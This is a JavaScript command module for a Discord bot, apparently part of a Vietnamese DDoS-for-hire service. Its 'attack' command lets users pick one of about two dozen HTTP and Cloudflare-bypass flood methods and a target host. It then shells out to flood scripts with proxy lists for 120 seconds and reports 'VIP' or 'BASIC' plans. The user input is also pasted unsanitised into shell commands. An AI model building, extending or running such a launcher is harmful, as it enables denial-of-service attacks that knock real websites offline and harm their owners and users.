const {
    MessageEmbed
} = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var img = ayarlar['img'];
var photovip = ayarlar['photovip'];
var randomgif = photovip[Math['floor']((Math['random']() * photovip['length']))];
module['exports'] = {
        name: 'attack',
        description: 'T\u1EA5n c\xF4ng trang Web',
        type: 'CHAT_INPUT',
        cooldown: 120,
        options: [{
            name: 'methods',
            description: 'Ph\u01B0\u01A1ng ph\xE1p t\u1EA5n c\xF4ng',
            required: true,
            type: 'STRING',
            choices: [{
                name: `${'CF-BASIC'}`,
                value: `${'CF-BASIC'}`,
                inline: true
            }, {
                name: `${'CF-BYPASS'}`,
                value: `${'CF-BYPASS'}`,
                inline: true
            }, {
                name: `${'CF-FLOODER'}`,
                value: `${'CF-FLOODER'}`,
                inline: true
            }, {
                name: `${'CF-UAM'}`,
                value: `${'CF-UAM'}`,
                inline: true
            }, {
                name: `${'FLOOD-GODZILLA'}`,
                value: `${'FLOOD-GODZILLA'}`,
                inline: true
            }, {
                name: `${'HTTP-SPAM'}`,
                value: `${'HTTP-SPAM'}`,
                inline: true
            }, {
                name: `${'HTTP-BROWSER'}`,
                value: `${'HTTP-BROWSER'}`,
                inline: true
            }, {
                name: `${'HTTP-BYPASS'}`,
                value: `${'HTTP-BYPASS'}`,
                inline: true
            }, {
                name: `${'HTTP-BYPASS2'}`,
                value: `${'HTTP-BYPASS2'}`,
                inline: true
            }, {
                name: `${'HTTP-COOKIE'}`,
                value: `${'HTTP-COOKIE'}`,
                inline: true
            }, {
                name: `${'HTTP-EVEN'}`,
                value: `${'HTTP-EVEN'}`,
                inline: true
            }, {
                name: `${'HTTP-FLOOD'}`,
                value: `${'HTTP-FLOOD'}`,
                inline: true
            }, {
                name: `${'HTTP-FUZZ'}`,
                value: `${'HTTP-FUZZ'}`,
                inline: true
            }, {
                name: `${'HTTP-MIX'}`,
                value: `${'HTTP-MIX'}`,
                inline: true
            }, {
                name: `${'HTTP-MIX2'}`,
                value: `${'HTTP-MIX2'}`,
                inline: true
            }, {
                name: `${'HTTP-RAND'}`,
                value: `${'HTTP-RAND'}`,
                inline: true
            }, {
                name: `${'HTTP-STAR'}`,
                value: `${'HTTP-STAR'}`,
                inline: true
            }, {
                name: `${'HTTP-RAW'}`,
                value: `${'HTTP-RAW'}`,
                inline: true
            }, {
                name: `${'HTTP-RAW2'}`,
                value: `${'HTTP-RAW2'}`,
                inline: true
            }, {
                name: `${'HTTP-SOCKETS'}`,
                value: `${'HTTP-SOCKETS'}`,
                inline: true
            }, {
                name: `${'FB-VIP'}`,
                value: `${'FB-VIP'}`,
                inline: true
            }, {
                name: `${'HTTPS-LOAD'}`,
                value: `${'HTTPS-LOAD'}`,
                inline: true
            }, {
                name: `${'HTTP-TLS2'}`,
                value: `${'HTTP-TLS2'}`,
                inline: true
            }, {
                name: `${'UAM'}`,
                value: `${'UAM'}`,
                inline: true
            }]
        }, {
            name: 'host',
            description: '\u0110\u1ECBa ch\u1EC9 t\u1EA5n c\xF4ng',
            required: true,
            type: 'STRING'
        }],
        run: async(_0x3d71x6, _0x3d71x7) => {
                const _0x3d71x8 = ayarlar['commandroom'];
                if (_0x3d71x7['channel']['id'] !== _0x3d71x8) {
                    return _0x3d71x7['reply']({
                        embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 d\xF9ng \u0111\u01B0\u1EE3c l\u1EC7nh n\xE0y trong <#'}${_0x3d71x8}${'>.'}`)['setFooter']({
                            text: '\xA9 Developer: Võ Tấn Phát | Shuynnv3'
                        })['setTimestamp']()]
                    })
                };
                const _0x3d71x9 = _0x3d71x7['options']['getString']('methods');
                const _0x3d71xa = _0x3d71x7['options']['getString']('host');
                if (_0x3d71x9 === 'CF-BASIC' || _0x3d71x9 === 'CF-BYPASS' || _0x3d71x9 === 'HTTP-MIX' || _0x3d71x9 === 'HTTP-MIX2' || _0x3d71x9 === 'HTTP-RAW' || _0x3d71x9 === 'HTTP-RAND' || _0x3d71x9 === 'HTTP-TLS' || _0x3d71x9 === 'HTTP-BYPASS') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ 𝓑𝓐𝓢𝓘𝓒 ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-BYPASS2' || _0x3d71x9 === 'HTTP-BROWSER') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 proxy 5'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-SPAM') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${'120 20 2000 proxy.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'UAM') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js GET'}${_0x3d71xa}${'proxy.txt 120 20 2000'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'CF-UAM' || _0x3d71x9 === 'HTTP-TLS2' || _0x3d71x9 === 'HTTP-RAW2') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 150 proxy.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-SOCKETS') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 999 120'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-STAR') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 20 proxy.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-COOKIE' || _0x3d71x9 === 'HTTP-EVEN' || _0x3d71x9 === 'HTTP-FUZZ') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' proxy.txt 120 GET'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTP-FLOOD') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 proxy.txt 5'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'HTTPS-LOAD') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' proxy.txt 120 GET'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                };
                if (_0x3d71x9 === 'FLOOD-GODZILLA' || _0x3d71x9 === 'CF-FLOODER') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js GET '}${_0x3d71xa}${' proxy.txt 120 150 5'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
                    const _0x3d71x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                        name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
                        value: `${' [ '}${_0x3d71x7['user']['username']}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🔗 Host:`**',
                        value: `${' [ '}${_0x3d71xa}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`\uD83D\uDCA5 Ph\u01B0\u01A1ng Ph\xE1p:`**',
                        value: `${' [ '}${_0x3d71x9}${' ] '}`,
                        inline: true
                    }, {
                        name: '**`🕒 Thời Gian:`**',
                        value: `${' [ 120 gi\xE2y ] '}`,
                        inline: true
                    }, {
                        name: '**`💸 Plan:`**',
                        value: `${' [ VIP ] '}`,
                        inline: true
                    })['setImage'](randomgif)['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    const _0x3d71x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://i.gifer.com/FRKK.gif')['setFooter']('\xA9 Developer: Nguyen Duc Thanh | Testdd', img)['setTimestamp']();
                    _0x3d71x7['reply']({
                        embeds: [_0x3d71x11]
                    })['then']((_0x3d71x12) => {
                        setTimeout(function () {
                            _0x3d71x7['editReply']({
                                embeds: [_0x3d71x10]
                            })
                        }, 3000)
                    })
                }}}